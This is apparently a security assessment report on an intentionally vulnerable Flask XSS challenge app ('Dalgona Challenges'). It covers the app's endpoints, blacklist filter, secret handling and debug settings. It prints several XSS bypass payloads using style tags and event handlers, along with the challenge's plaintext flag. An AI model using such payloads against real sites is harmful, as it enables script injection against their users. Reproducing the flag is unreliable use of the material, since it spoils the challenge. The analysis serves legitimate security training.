# Penetration Test Scope & Boundaries

**Primary Directive:** This analysis is strictly limited to the **network-accessible attack surface** of the application. All findings adhere to this scope definition.

## In-Scope: Network-Reachable Components
Components are **in-scope** if their execution can be initiated, directly or indirectly, by a network request that the deployed application server is capable of receiving. This includes:
- Publicly exposed web pages and API endpoints
- Endpoints requiring authentication via the application's standard login mechanisms (none present in this application)
- Any developer utility, debug console, or script that has been mistakenly exposed through a route or is otherwise callable from other in-scope, network-reachable code

## Out-of-Scope: Locally Executable Only
Components are **out-of-scope** if they **cannot** be invoked through the running application's network interface and require an execution context completely external to the application's request-response cycle. This includes:
- Command-line interface tools (e.g., `python scripts/...`)
- Development environment's internal tooling
- CI/CD pipeline scripts or build tools
- Database migration scripts, backup tools, or maintenance utilities
- Local development servers, test harnesses, or debugging utilities
- Static files or scripts that require manual opening in a browser (not served by the application)

---

## 1. Executive Summary

This is a **Python Flask-based XSS challenge application** (named "Dalgona Challenges") operating as an intentionally vulnerable CTF-style security training platform. The application exposes a minimal attack surface consisting of only **two HTTP endpoints** with **zero authentication or authorization controls**. The codebase runs on critically outdated technology—**Python 2.7.18** (end-of-life since January 2020) and **Flask 1.1.4**—creating a foundation of unpatched vulnerabilities before even considering application-level security.

The application's primary security weakness is an **intentional XSS vulnerability** in the `/page` endpoint, where user input undergoes blacklist-based filtering that explicitly allows `<style>` tags while blocking other HTML elements. This filtered input is then directly embedded into HTML responses and processed by a PhantomJS headless browser for XSS detection. When successful XSS payloads are detected, the application discloses a CTF flag stored in plaintext on the filesystem.

**Critical Security Posture Findings:**
- **Zero Defense-in-Depth:** No authentication, authorization, CSRF protection, rate limiting, or security headers implemented
- **Severe Secret Management Failures:** CTF flag stored in plaintext in version control (`.env` file), Docker build arguments, and filesystem
- **Debug Mode Enabled in Production:** Flask debug mode active (`app.run(debug=True)`), exposing Werkzeug debugger with potential RCE capabilities
- **Abandoned Technology Stack:** Python 2.7.18 and PhantomJS (abandoned since 2018) with multiple known CVEs and zero security support
- **No Encryption:** All data transmitted over HTTP, no TLS/HTTPS configuration, no data-at-rest encryption

While the XSS vulnerability is intentional for educational purposes, multiple critical security deficiencies—particularly secret management practices, debug mode configuration, and the use of end-of-life software—represent genuine security risks even in a CTF deployment context. This application should **never be exposed to production environments or untrusted networks** without comprehensive security hardening.

---

## 2. Architecture & Technology Stack

### Framework & Language

**Core Technology:**
- **Language:** Python 2.7.18 (CRITICAL - End-of-Life since January 1, 2020)
- **Web Framework:** Flask 1.1.4 (CRITICAL - Outdated, released ~2020, approximately 4 years behind current version)
- **Template Engine:** Python string `.format()` (not Jinja2 auto-escaping)

**Security Implications:**

The application runs on a technology foundation that represents **critical security debt**. Python 2.7.18 reached official end-of-life over five years ago, meaning zero security patches are available for newly-discovered vulnerabilities in the Python interpreter, standard library, or C extensions. The Flask 1.1.4 framework, while more recent than Python 2, is similarly outdated and missing modern security features introduced in Flask 2.x and 3.x releases.

**Dependency Analysis** (`requirements.txt`):
```
Flask==1.1.4
phantomjs
```

**Known Vulnerability Profile:**
1. **Python 2.7.18:** Multiple unpatched CVEs including Unicode handling bugs, pickle deserialization vulnerabilities, and SSL/TLS weaknesses
2. **Flask 1.1.4:** Missing security improvements from Flask 2.x including enhanced CORS handling, improved session security, and modern cryptographic defaults
3. **PhantomJS:** Project abandoned in 2018 with documented XSS vulnerabilities (CVE-2019-17221), arbitrary code execution issues, and SSL verification bypasses

The use of Python 2's legacy encoding system is evident in lines 5-6 of `app.py`:
```python
reload(sys)
sys.setdefaultencoding('utf8')
```
This pattern is a Python 2 anti-pattern that can introduce Unicode-related security vulnerabilities and is completely unnecessary in Python 3.

**Architectural Pattern:**

This is a **monolithic synchronous web application** following a traditional MVC-like pattern without formal model or view layers. The architecture consists of:

- **Controller Layer:** Flask route handlers in `app.py` (2 routes total)
- **Template Layer:** Static HTML templates in `constants.py` (no Jinja2, using string formatting)
- **Service Layer:** Single `check_solution()` function orchestrating PhantomJS execution
- **External Process:** PhantomJS headless browser for XSS detection

**Trust Boundaries:**

The application establishes several critical trust boundaries that define its attack surface:

1. **External User → Flask Application:** The primary trust boundary where untrusted HTTP requests enter the system. No authentication or input validation at this boundary except for a weak blacklist regex filter.

2. **Flask Application → PhantomJS Subprocess:** The application spawns PhantomJS processes via `subprocess.Popen()` and passes user-controlled content through temporary HTML files. While the subprocess arguments are hardcoded (preventing command injection), the content passed to PhantomJS is attacker-controlled, allowing XSS exploitation within the PhantomJS execution context.

3. **PhantomJS → Localhost HTTP Server:** PhantomJS makes HTTP requests back to `localhost:5000` to fetch temporary HTML files. This creates an internal request loop but does not expose SSRF vulnerabilities since the URL structure is controlled by the application.

4. **Application → Filesystem:** The application writes user-controlled content to temporary files in the `static/` directory, creating a potential race condition window where attackers might access these files before deletion.

**Deployment Architecture:**

The application is containerized using Docker with the following configuration:

**Dockerfile** (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/Dockerfile`):
- Base Image: `python:2.7.18-slim` (Debian Buster)
- Exposed Port: 5000
- Runs as root user (no USER directive present - **security risk**)
- PhantomJS installed via apt package
- Flag injected at build time via `ARG FLAG` and `sed` substitution

**Docker Compose** (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/docker-compose.yml`):
```yaml
services:
  web:
    build:
      context: ./src
      args:
        - FLAG=${FLAG}
    ports:
      - "5000:5000"
```

**Security Concerns:**
- Container runs as root (privilege escalation risk)
- Secrets baked into image layers at build time (flag persists in image history)
- No health checks for security monitoring
- No resource limits (CPU/memory) configured
- Environment variable `OPENSSL_CONF=/dev/null` disables OpenSSL configuration

### Critical Security Components

**The application implements ZERO traditional security controls:**

❌ **No Authentication Middleware:** No login system, no user management, no session handling  
❌ **No Authorization Mechanisms:** No role-based access control, no permission checks  
❌ **No Security Headers:** No CSP, X-Frame-Options, HSTS, X-Content-Type-Options, or Referrer-Policy  
❌ **No CORS Configuration:** Default same-origin policy only  
❌ **No CSRF Protection:** No tokens, no SameSite cookies  
❌ **No Rate Limiting:** Unlimited requests allowed, potential DoS via PhantomJS subprocess spawning  
❌ **No Input Validation Framework:** Single blacklist regex, no whitelist validation  
❌ **No WAF or Request Filtering:** No Web Application Firewall

**Weak Security Implementations:**

1. **Blacklist-Based XSS Filter** (`app.py:66-67`):
```python
blacklist = r'<(?!style\b)[^>]+>'
msg = re.sub(blacklist, '', msg, flags=re.IGNORECASE | re.DOTALL)
```
This regex attempts to strip HTML tags except `<style>` tags. The intentional allowance of `<style>` tags creates the challenge's XSS vulnerability, enabling CSS-based attacks and script execution.

2. **Partial Output Escaping** (`app.py:58`):
```python
data = '<div class="solution-text">... {1}</div>'.format(IMAGE_ROUTES[tag]['process'], cgi.escape(result))
```
PhantomJS output is escaped using `cgi.escape()`, but user input in other contexts is not escaped.

3. **Secure Random Filename Generation** (`app.py:35`):
```python
fn = "static/" + os.urandom(16).encode('hex') + '.html'
```
Uses cryptographically secure random number generation for temporary files (good practice), but files are still written to a publicly-accessible directory.

**Logging Configuration:**

Basic logging is configured but largely unused:
```python
import logging
logging.basicConfig(level=logging.INFO)
```

Instead, the application uses Python 2 `print` statements that output sensitive data:
```python
print "Page:"
print page  # Contains user input
print "Resultado:"
print result  # Contains PhantomJS output
```

These debug prints expose user payloads and internal state to Docker logs, creating an information disclosure vector.

---

## 3. Authentication & Authorization Deep Dive

### Authentication Mechanisms: **NONE EXIST**

**Critical Finding:** This application implements **ZERO authentication** of any kind. There is no login system, no user management, no session tracking, and no access control whatsoever.

**Complete Endpoint Inventory:**

| Route | File | Line | HTTP Methods | Authentication Required |
|-------|------|------|--------------|-------------------------|
| `/` | `app.py` | 29-31 | GET (default) | ❌ None - Public access |
| `/page` | `app.py` | 63-72 | GET (default) | ❌ None - Public access |
| `/static/<path>` | Flask built-in | N/A | GET (default) | ❌ None - Public access |

**Exhaustive List of Authentication API Endpoints:**
- ❌ No `/login` endpoint
- ❌ No `/logout` endpoint  
- ❌ No `/register` or `/signup` endpoint
- ❌ No `/auth/*` endpoints
- ❌ No token refresh endpoints
- ❌ No password reset endpoints
- ❌ No MFA/2FA endpoints
- ❌ No OAuth callback endpoints

**Authentication Methods Analysis:**

The application imports Flask's `make_response` but never uses it to set cookies or authentication headers:
```python
# app.py:3 - Imported but NEVER USED
from flask import Flask, request, Response, make_response, url_for
```

No authentication libraries are present in dependencies:
- ❌ No Flask-Login
- ❌ No Flask-JWT-Extended
- ❌ No Flask-Security
- ❌ No PyJWT
- ❌ No OAuth libraries (OAuthlib, requests-oauthlib)
- ❌ No LDAP/AD integration
- ❌ No SAML libraries

### Session Management: **NOT IMPLEMENTED**

**Flask Secret Key Status:** ❌ **NOT CONFIGURED**

The application configuration only sets one directive:
```python
# app.py:24-25
app = Flask(__name__)
app.config['PROPAGATE_EXCEPTIONS'] = True
```

No `app.secret_key` is configured, which would be required for Flask session management. Without this, any attempt to use Flask sessions would result in unsigned cookies that could be trivially forged by attackers.

**Session Cookie Flags Configuration:**

**EXACT FILE AND LINE NUMBERS WHERE COOKIE FLAGS SHOULD BE SET:** ❌ **NONE - NOT CONFIGURED ANYWHERE**

| Security Flag | Status | Location | Risk |
|---------------|--------|----------|------|
| **HttpOnly** | ❌ Not Set | N/A | Cookies vulnerable to XSS theft |
| **Secure** | ❌ Not Set | N/A | Cookies transmitted over HTTP |
| **SameSite** | ❌ Not Set | N/A | CSRF attacks possible |

**Analysis:** The application does not create any cookies. While `make_response` is imported, it is never invoked. No session middleware is present, and no cookie setting code exists in the application.

**Session Storage Mechanism:** ❌ None (no sessions implemented)

The application has no concept of user sessions:
- No Redis session store
- No database session storage
- No JWT-based sessions
- No in-memory session management
- No Flask session usage detected

**Security Impact:** Every request is completely stateless with no user tracking, session timeout enforcement, or privilege management. This is appropriate for a single-challenge CTF platform but would be catastrophic in any multi-user or stateful application.

### Authorization Model: **NOT IMPLEMENTED**

**Permission/Role Checking:** ❌ None

No authorization logic exists anywhere in the codebase:
- No `@login_required` decorators
- No permission checks in route handlers
- No role-based access control (RBAC)
- No attribute-based access control (ABAC)
- No resource ownership validation
- No tenant isolation checks

**Privilege Escalation Prevention:** ❌ Not applicable (no privileges exist)

Since there are no users, roles, or permissions, there are no privilege escalation protections. Every visitor has identical unrestricted access to all functionality.

### SSO/OAuth/OIDC Flows: **NOT IMPLEMENTED**

**OAuth/OIDC Implementation Status:** ❌ None

- No OAuth client configuration
- No OIDC discovery endpoints
- No SSO integration
- No callback URL handlers
- No state parameter validation
- No nonce parameter validation  
- No token exchange flows
- No identity provider integration

**Dead Code Discovery:**

An unused template contains a URL input field:
```html
# constants.py:143 - TEMPLATE_CONTENT_IFRAME (NEVER USED)
<input type=text name=url placeholder="Enter the URL you want to visit...">
```

This template is **never rendered** by any route handler. The only templates used are:
- `INDEX_CONTENT` (for `/` route)
- `TEMPLATE_CONTENT_TAG` (for `/page` route)

This appears to be dead code from a different challenge or incomplete feature.

### Multi-Factor Authentication (MFA)

**Status:** ❌ Not implemented

**Account Lockout and Brute Force Protection**

**Status:** ❌ Not implemented

Since there is no authentication system, there are no accounts to lock out and no credentials to brute force. However, the `/page` endpoint could be abused for denial-of-service by rapidly spawning PhantomJS subprocesses (no rate limiting exists).

### Security Weaknesses Summary

1. **Complete Lack of Authentication:** The application is entirely public with no access controls
2. **No Session Security:** No session management, cookies, or stateful user tracking
3. **Missing Flask Secret Key:** Critical configuration for session security is absent
4. **No Authorization Layer:** Every visitor has full access to all functionality
5. **No Account Management:** No user registration, password policies, or credential management

**Risk Assessment:** While appropriate for a single-challenge CTF platform, this architecture would be **CRITICAL severity** for any application handling sensitive data or requiring access control.

---

## 4. Data Security & Storage

### Database Security: **NO DATABASE PRESENT**

**Database Type:** None detected

**Analysis:**
After comprehensive code review, no database connections, query execution, or database libraries exist in this application. There are:
- ❌ No SQL queries
- ❌ No ORM frameworks (SQLAlchemy, Django ORM, Peewee)
- ❌ No database drivers (psycopg2, pymongo, mysql-connector)
- ❌ No Redis or cache stores
- ❌ No connection pooling

**Data Persistence:** The only persistent storage is the filesystem:
- `secret.txt` - Contains CTF flag in plaintext
- Temporary HTML files in `static/` directory (created and deleted during request handling)

**Security Assessment:** N/A - No database security controls needed due to absence of database

### Data Flow Security: **CRITICAL VULNERABILITIES**

#### Flow 1: CTF Flag Disclosure Chain

The flag's journey from storage to network disclosure represents a complete failure of secret management:

```
[Storage Layer]
/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/.env:1
    FLAG="flag{fcec3afc-4b74-433f-b638-14091e51092e}"
    ⚠️ Security Control: NONE - Committed to Git
    🔴 CRITICAL: Secret in version control
    
    ↓ (Docker Compose reads environment variable)

[Build Layer]  
/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/Dockerfile:23-25
    ARG FLAG
    RUN sed -i s/@FLAG@/$FLAG/g secret.txt
    ⚠️ Security Control: NONE - Build argument visible in image history
    🔴 CRITICAL: Secret persists in Docker layers
    
    ↓ (Flag written to secret.txt in container image)

[Application Layer]
/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/app.py:22
    flags = open('secret.txt').read().split()
    ⚠️ Security Control: NONE - Plaintext file read
    🔴 HIGH: No encryption, no access controls
    
    ↓ (Flag loaded into application memory)

[Execution Layer]
/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/app.py:70-72
    result = check_solution(data, flags[0], msg, 'level_3')
    if result == 'XSS':
        return '<div>...{1}</div>'.format(flag)
    ⚠️ Security Control: NONE - Plaintext disclosure
    🔴 HIGH: Flag transmitted over HTTP in response body
```

**Sensitive Data Exposure Points:**
1. **Line 1 (.env):** Flag visible in Git repository
2. **Line 23-25 (Dockerfile):** Flag in build arguments and image layers  
3. **Line 22 (app.py):** Flag in application memory (plaintext)
4. **Line 56 (app.py):** Flag in HTTP response (plaintext, no TLS)
5. **Line 42 (app.py):** Flag potentially visible in debug logs

#### Flow 2: User Input → XSS Payload → Flag Disclosure

```
[Input Layer]
GET /page?name=<PAYLOAD>
    ↓ request.args.get('name', '')
    File: app.py:65
    ⚠️ Security Control: NONE at input boundary
    
[Sanitization Layer]
    blacklist = r'<(?!style\b)[^>]+>'
    msg = re.sub(blacklist, '', msg, ...)
    File: app.py:66-67
    ⚠️ Security Control: WEAK blacklist (allows <style> tags)
    🔴 VULNERABILITY: Bypassable filter
    
[Template Injection Layer]
    value = "" if msg == "" else '{0}'.format(msg)
    data = TEMPLATE_CONTENT_TAG.format("23", "Star", value, "", "")
    File: app.py:68-70
    ⚠️ Security Control: NONE (no output escaping)
    🔴 VULNERABILITY: Direct HTML injection
    
[File System Layer]
    fn = "static/" + os.urandom(16).encode('hex') + '.html'
    of.write(page)  # Contains user payload
    File: app.py:38-39
    ✅ Security Control: Cryptographically secure random filename
    🟡 WEAKNESS: Files in publicly-accessible directory
    
[Subprocess Execution Layer]
    proc = subprocess.Popen(["timeout","5","phantomjs", "check.js"], ...)
    proc.stdin.write(url)  # url = 'http://localhost:5000/' + fn
    File: app.py:34-44
    ✅ Security Control: Hardcoded command arguments (no injection)
    🔴 EXPOSURE: Debug logging prints full page content (line 42)
    
[XSS Detection Layer]
    PhantomJS executes JavaScript in user-controlled HTML
    check.js detects alert/confirm/prompt calls
    File: check.js:8-18
    🔴 VULNERABILITY: Intended XSS execution for challenge
    
[Response Layer]
    if result == 'XSS':
        return FLAG in HTTP response body
    File: app.py:56
    🔴 EXPOSURE: Flag disclosed over HTTP (no TLS)
```

**Data Protection Mechanisms:**
- ✅ **Secure RNG:** `os.urandom(16)` for filename generation (line 35)
- ✅ **Output Escaping (Partial):** `cgi.escape(result)` on PhantomJS output (line 58)
- ✅ **File Cleanup:** `os.unlink(fn)` in finally block (line 50)
- ❌ **No Input Validation:** Only blacklist filtering
- ❌ **No Output Encoding:** User input not escaped in template
- ❌ **No Encryption:** All data plaintext in storage and transit
- ❌ **No Access Controls:** No authentication or authorization

### Multi-Tenant Data Isolation: **NOT APPLICABLE**

This is a single-tenant application (CTF challenge platform). No multi-tenancy features exist:
- No tenant ID isolation
- No database partitioning (no database exists)
- No cross-tenant access controls
- No tenant-specific data segregation

### Encryption Analysis: **ZERO ENCRYPTION IMPLEMENTED**

**Encryption at Rest:** ❌ None

The flag is stored in **plaintext** in multiple locations:
- `.env` file: `FLAG="flag{fcec3afc-4b74-433f-b638-14091e51092e}"`
- `secret.txt` in container: Plaintext after sed substitution
- Application memory: Plaintext string in `flags` array

**Encryption in Transit:** ❌ None

The application runs on **HTTP only** with no TLS/HTTPS configuration:

```yaml
# docker-compose.yml:8
ports:
  - "5000:5000"  # HTTP, not HTTPS
```

```python
# app.py:76
app.run(debug=True)  # No SSL context
```

**Security Impact:** All data transmitted over the network is visible to attackers:
- User XSS payloads visible in cleartext GET requests
- CTF flag disclosed in cleartext HTTP responses
- Session cookies (if any existed) vulnerable to interception
- No protection against man-in-the-middle attacks

**Cryptographic Libraries:** ❌ None used

No encryption or hashing libraries detected:
- ❌ No `cryptography` or `pycryptodome`
- ❌ No `bcrypt` or `argon2`
- ❌ No SSL/TLS configuration
- ❌ No password hashing (no passwords exist)

**One Good Practice Identified:**
```python
# app.py:35 - Cryptographically secure random number generation
fn = "static/" + os.urandom(16).encode('hex') + '.html'
```
The application correctly uses `os.urandom()` for generating unpredictable filenames, preventing attackers from guessing temporary file locations.

**OpenSSL Configuration Disabled:**
```dockerfile
# Dockerfile:14
ENV OPENSSL_CONF=/dev/null
```
This environment variable disables OpenSSL configuration entirely, likely to suppress SSL warnings in the PhantomJS environment but creating a potential security risk.

### Sensitive Data Inventory

#### 1. CTF Flag (Challenge Secret)

**Locations and Security Posture:**

| Storage Location | File Path | Line | Protection | Risk Level |
|------------------|-----------|------|------------|------------|
| **Version Control** | `.env` | 1 | ❌ None | 🔴 **CRITICAL** |
| **Container Image** | `secret.txt` | N/A | ❌ None | 🔴 **HIGH** |
| **Application Memory** | `app.py` | 22 | ❌ None | 🔴 **HIGH** |
| **HTTP Response** | `app.py` | 56 | ❌ None | 🔴 **HIGH** |
| **Debug Logs** | `app.py` | 42 | ❌ None | 🟡 **MEDIUM** |

**Secret Exposure Analysis:**

The flag appears in Git history, Docker build arguments, container filesystem, application memory, HTTP responses, and potentially in stdout logs. An attacker with access to any of these layers can retrieve the flag without solving the challenge.

**Recommended Remediation:**
1. Remove `.env` from Git history using `git filter-branch` or BFG Repo-Cleaner
2. Use runtime environment variables instead of build arguments
3. Implement Docker secrets or Kubernetes secrets for production
4. Add TLS/HTTPS for encrypted transmission
5. Remove debug logging of sensitive data

#### 2. User Input (XSS Payloads)

**Type:** Potentially malicious user-supplied content  
**Location:** `app.py:65` - `request.args.get('name', '')`  
**Storage:** Temporary (in-memory, temporary files in `static/`)  
**Protection:** Weak blacklist regex filter  
**Risk:** 🔴 **HIGH** - Intentional XSS vulnerability

#### 3. PhantomJS Execution Results

**Type:** Browser console output (may contain sensitive data)  
**Location:** `app.py:45` - `proc.stdout.readline()`  
**Storage:** In-memory, logged to stdout  
**Protection:** Escaped with `cgi.escape()` before rendering (line 58)  
**Risk:** 🟢 **LOW** - Properly escaped

### Debug Logging Security Issues

**Sensitive Data Exposure in Logs:**

```python
# app.py:41-47
print "Page:"
print page  # 🔴 EXPOSES: Full HTML page with user XSS payload
print "Resultado:"  
print result  # 🟡 EXPOSES: PhantomJS execution results
```

These `print` statements output to container stdout, accessible via:
- `docker logs <container_id>`
- Kubernetes pod logs
- Centralized logging systems (if configured)

**Security Risks:**
- User payloads (including XSS attempts) logged in cleartext
- Potential PII exposure if users include personal data
- Attack pattern visibility to unauthorized log viewers
- No log sanitization or redaction

**Logging Configuration:**
```python
# app.py:15-17
import logging
logging.basicConfig(level=logging.INFO)
```

While Python's `logging` module is configured, the application uses legacy `print` statements instead, bypassing proper log levels and structured logging.

### Compliance Assessment

**GDPR (General Data Protection Regulation):** ❌ Non-compliant

If this application handled real user data, it would violate:
- Article 32: Security of Processing (no encryption, no access controls)
- Article 25: Data Protection by Design (no security controls)
- Article 33: Breach Notification (no monitoring or alerting)

**Current Status:** The application processes no PII, so GDPR is not applicable to this CTF challenge.

**PCI-DSS:** ✅ Not applicable (no payment processing)

**HIPAA:** ✅ Not applicable (no health data)

**General Security Standards (NIST, CIS, OWASP):** ❌ Non-compliant
- Fails OWASP Top 10 requirements (A01, A02, A04, A05, A06, A07, A09)
- Does not meet CIS Docker Benchmark controls (runs as root, debug enabled)
- Violates NIST 800-53 controls for access control, encryption, and logging

---

## 5. Attack Surface Analysis

### External Entry Points: **2 Network-Accessible Routes + Static Files**

#### Entry Point 1: Root Index Page

**Endpoint:** `GET /`  
**File Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/app.py:29-31`  
**Network Accessibility:** ✅ Public (no authentication)

**Code:**
```python
@app.route('/')
def index():
    return INDEX_CONTENT
```

**Functionality:** Serves static HTML landing page displaying challenge menu

**Input Parameters:** None

**Attack Surface Analysis:**
- **Input Validation:** Not applicable (no user input)
- **Output Encoding:** Not applicable (static content)
- **Authentication:** ❌ None
- **Rate Limiting:** ❌ None
- **Security Headers:** ❌ None

**Exploitability:** 🟢 **LOW** - No dynamic behavior, no user input processing

**Security Concerns:**
- No Content-Security-Policy header (allows inline scripts if content were dynamic)
- No X-Frame-Options (clickjacking possible if sensitive actions existed)
- Served over HTTP (no confidentiality protection)

**Template Content** (`constants.py:1-30`):
The `INDEX_CONTENT` template contains static HTML with links to the challenge page. No user input is processed or reflected.

---

#### Entry Point 2: XSS Challenge Page (PRIMARY ATTACK SURFACE)

**Endpoint:** `GET /page`  
**File Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/app.py:63-72`  
**Network Accessibility:** ✅ Public (no authentication)

**Code:**
```python
@app.route('/page')
def page_handler():
    msg = request.args.get('name','')
    blacklist = r'<(?!style\b)[^>]+>'
    msg = re.sub(blacklist, '', msg, flags=re.IGNORECASE | re.DOTALL)
    value =  "" if msg == "" else '{0}'.format(msg)
    
    data = TEMPLATE_CONTENT_TAG.format("23", "Star", value, "", "")
    result = check_solution(data,flags[0],msg,'level_3')
    return TEMPLATE_CONTENT_TAG.format("23", "Star", value, result, "")
```

**Input Parameters:**
- `name` (query parameter, GET)
  - Type: String
  - Required: No (defaults to empty string)
  - Validation: Blacklist regex filter only
  - Max Length: No limit enforced
  - Encoding: UTF-8 (via Python 2 `setdefaultencoding`)

**Attack Surface Analysis:**

**1. Input Validation:**
- **Method:** Blacklist-based regex filtering
- **Pattern:** `r'<(?!style\b)[^>]+>'`
- **Flags:** `re.IGNORECASE | re.DOTALL`
- **Allowed:** `<style>` tags and all tag attributes
- **Blocked:** All other HTML tags (e.g., `<script>`, `<img>`, `<svg>`, `<iframe>`)

**Bypass Potential:** 🔴 **HIGH**

The regex explicitly allows `<style>` tags, enabling:
- CSS injection attacks
- `expression()` in Internet Explorer
- `@import` with `javascript:` protocol
- CSS-based data exfiltration
- `behavior:` CSS property for code execution (older browsers)

**Example Bypass Payloads:**
```
?name=<style>*{background:url('javascript:alert(1)')}</style>
?name=<style>@import'data:,*%7bx:expression(alert(1))%7d';</style>
?name=<sTyLe>body{x:expression(alert(1))}</sTyLe>
```

**2. Output Encoding:**
- **Method:** None - Direct string interpolation
- **Context:** HTML body
- **Template Engine:** Python `.format()` (no auto-escaping)
- **Insertion Point:** `TEMPLATE_CONTENT_TAG` position `{2}`

**Template Structure** (`constants.py:78-100`):
```html
<form class="box-form">
    <input type=text name=name placeholder="Enter your name...">
    {2}  <!-- USER INPUT INSERTED HERE WITHOUT ESCAPING -->
</form>
```

**XSS Risk:** 🔴 **CRITICAL**

User input is directly concatenated into HTML without any output encoding, allowing full HTML injection.

**3. Backend Processing:**

The `check_solution()` function is invoked with user input:

**File Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/app.py:33-51`

```python
def check_solution(page, flag, msg, tag):
    proc = subprocess.Popen(["timeout","5","phantomjs", "check.js"], 
                           stdout=subprocess.PIPE, stdin=subprocess.PIPE)
    fn = "static/" + os.urandom(16).encode('hex') + '.html'
    url = 'http://localhost:5000/' + fn
    try:
        of = open(fn, 'w')
        of.write(page)  # User-controlled content written to file
        of.close()
        print "Page:"
        print page  # DEBUG: Logs user payload
        proc.stdin.write(url)
        proc.stdin.close()
        result = proc.stdout.readline().strip()
        print "Resultado:"
        print result  # DEBUG: Logs PhantomJS result
        
        if result == 'XSS':
            return '<div>...{1}</div>'.format(flag)  # Flag disclosed
        elif result:
            return '<div>...{1}</div>'.format(cgi.escape(result))
    finally:
        os.unlink(fn)  # File cleanup
```

**Security Implications:**

a) **Temporary File Creation (Lines 38-39):**
   - User payload written to `static/[random].html`
   - Files are in web-accessible directory
   - Race condition window: File exists from creation until `os.unlink(fn)` executes
   - Attacker could potentially access file if they guess the random filename during this window

b) **PhantomJS Subprocess Execution (Line 34):**
   - Spawns external process with 5-second timeout
   - No rate limiting on subprocess spawning
   - Potential DoS vector: Rapid requests spawn unlimited PhantomJS instances

c) **Debug Logging (Lines 41-42, 46-47):**
   - User payloads logged to stdout
   - Logs accessible via `docker logs`
   - Potential information disclosure

d) **Flag Disclosure (Line 56):**
   - If XSS detected, flag returned in HTTP response
   - Transmitted over HTTP (no TLS)
   - Flag visible in network traffic

**4. Response Handling:**

The function returns one of three responses:
- **Success (XSS detected):** Flag disclosed in `<div>` element
- **Failure (no XSS):** Error message with escaped PhantomJS output
- **Error:** Exception propagated (due to `PROPAGATE_EXCEPTIONS = True`)

**Attack Vectors:**

| Attack Type | Feasibility | Impact | Evidence |
|-------------|-------------|--------|----------|
| **XSS via `<style>` tag** | 🔴 HIGH | 🔴 CRITICAL | Regex allows `<style>` tags |
| **Race condition file access** | 🟡 MEDIUM | 🟡 MEDIUM | Files in `static/` directory |
| **DoS via subprocess spam** | 🔴 HIGH | 🟡 MEDIUM | No rate limiting |
| **Information disclosure via logs** | 🟢 LOW | 🟡 MEDIUM | Debug prints to stdout |
| **Command injection** | 🟢 NONE | N/A | Hardcoded subprocess args |

---

#### Entry Point 3: Static File Serving

**Endpoint:** `GET /static/<path:filename>`  
**File Location:** Flask built-in static file handler  
**Network Accessibility:** ✅ Public (no authentication)

**Functionality:** Serves static assets from `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-015-24/src/static/` directory

**Accessible Files:**
- `static/css/style.css` - Main stylesheet
- `static/css/templates/*.css` - Template stylesheets (9 files)
- `static/img/*.png` - Images (13 files)
- `static/css/fonts/*` - Fonts (4 files: .woff, .woff2, .otf, .eot)
- `static/assets/fav-icon.png` - Favicon
- **DYNAMIC:** `static/[random].html` - Temporarily created HTML files during challenge validation

**Security Concerns:**

1. **Temporary File Exposure:**
   - HTML files containing user payloads are written to `static/` directory
   - Files have random names but exist briefly before deletion
   - Potential race condition if attacker can guess filename

2. **Directory Listing:**
   - Flask does not enable directory listing by default (✅ safe)
   - Attackers cannot enumerate files in `static/`

3. **Content-Type Sniffing:**
   - No `X-Content-Type-Options: nosniff` header
   - Browsers might misinterpret file types
   - Low risk given static content types

4. **Path Traversal:**
   - Flask's built-in static handler prevents `../` attacks (✅ safe)
   - Cannot access files outside `static/` directory

**Exploitability:** 🟢 **LOW** for static assets, 🟡 **MEDIUM** for temporary HTML files

---

### Internal Service Communication: **NONE (Monolithic Application)**

This is a monolithic application with no microservices, internal APIs, or service-to-service communication.

**Only Internal Communication:**

**PhantomJS → Flask Application** (HTTP localhost loopback):
- **Source:** PhantomJS subprocess (check.js)
- **Destination:** `http://localhost:5000/static/[random].html`
- **Protocol:** HTTP
- **Trust Relationship:** Implicit trust (PhantomJS assumes localhost is safe)
- **Security Controls:** None (no mutual TLS, no authentication)

**Code Reference:**
```javascript
// check.js:20
page.open(input, function(status) {
    // 'input' is 'http://localhost:5000/static/[random].html'
```

**Security Implications:**

If an attacker can exploit XSS to make PhantomJS request a different URL (not possible in current code since URL is hardcoded), they might:
- Access internal network resources
- Probe localhost services
- Exfiltrate data via DNS or HTTP requests

**Current Assessment:** 🟢 **SAFE** - URL is application-controlled, not user-controlled

---

### Input Validation Patterns

**Pattern 1: Blacklist-Based HTML Tag Filter**

**Location:** `app.py:66-67`

```python
blacklist = r'<(?!style\b)[^>]+>'
msg = re.sub(blacklist, '', msg, flags=re.IGNORECASE | re.DOTALL)
```

**Analysis:**
- **Type:** Negative security model (blacklist)
- **Coverage:** HTML tags only (not attributes or JavaScript contexts)
- **Strengths:** Case-insensitive matching (`re.IGNORECASE`)
- **Weaknesses:**
  - Explicitly allows `<style>` tags (intentional vulnerability)
  - Does not filter tag attributes (e.g., `onclick`, `onerror`)
  - Does not sanitize JavaScript contexts
  - Does not handle encoded payloads (e.g., HTML entities, Unicode)
  - Blacklists are inherently incomplete

**Bypass Examples:**
```html
<!-- Style tag injection -->
<style>body{x:expression(alert(1))}</style>

<!-- Attribute injection (if <input> tag allowed) -->
<input onfocus=alert(1) autofocus>

<!-- Case variation (handled by IGNORECASE) -->
<StYlE>...</sTyLe>

<!-- Encoded payloads -->
&lt;script&gt;alert(1)&lt;/script&gt; (HTML entities - NOT blocked by regex)
```

**Pattern 2: Output Escaping (Partial)**

**Location:** `app.py:58`

```python
data = '<div class="solution-text">...{1}</div>'.format(IMAGE_ROUTES[tag]['process'], cgi.escape(result))
```

**Analysis:**
- **Type:** Output encoding using `cgi.escape()`
- **Context:** HTML body
- **Coverage:** Only PhantomJS output (`result`), NOT user input (`msg`)
- **Effectiveness:** ✅ Properly prevents XSS from PhantomJS output

**Inconsistency:** User input in `value` variable is NOT escaped when inserted into templates (line 70), but PhantomJS output IS escaped. This creates an inconsistent security posture.

**Pattern 3: No Validation**

